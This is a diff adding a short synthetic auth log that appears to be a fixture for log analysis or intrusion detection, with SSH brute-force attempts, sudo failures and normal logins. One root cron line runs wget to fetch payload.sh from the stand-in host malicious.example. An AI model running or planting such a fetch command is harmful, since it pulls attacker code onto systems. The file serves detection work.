@@ -1,0 +1,10 @@
+Oct 16 10:00:01 server1 sshd[1234]: Failed password for invalid user admin from 203.0.113.45 port 22 ssh2
+Oct 16 10:01:15 server1 sshd[1235]: Accepted password for alice from 192.0.2.5 port 52222 ssh2
+Oct 16 10:05:02 server1 sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1001 euid=0 tty=/dev/pts/1 ruser=bob rhost= user=bob
+Oct 16 10:06:17 server1 sshd[1236]: Invalid user test from 198.51.100.22 port 34567
+Oct 16 10:10:10 server1 cron[789]: (root) COMMAND= /usr/bin/wget http://malicious.example/payload.sh
+Oct 16 10:12:33 server1 sshd[1237]: Failed password for root from 203.0.113.45 port 22 ssh2
+Oct 16 10:15:00 server1 sshd[1238]: Failed password for bob from 198.51.100.22 port 22 ssh2
+Oct 16 10:18:45 server1 sudo: pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 euid=0 tty=/dev/pts/2 ruser=alice rhost= user=alice
+Oct 16 10:22:11 server1 sshd[1240]: Accepted password for charlie from 192.0.2.10 port 33333 ssh2
+Oct 16 10:25:30 server1 sshd[1241]: Failed password for invalid user guest from 203.0.113.99 port 22 ssh2
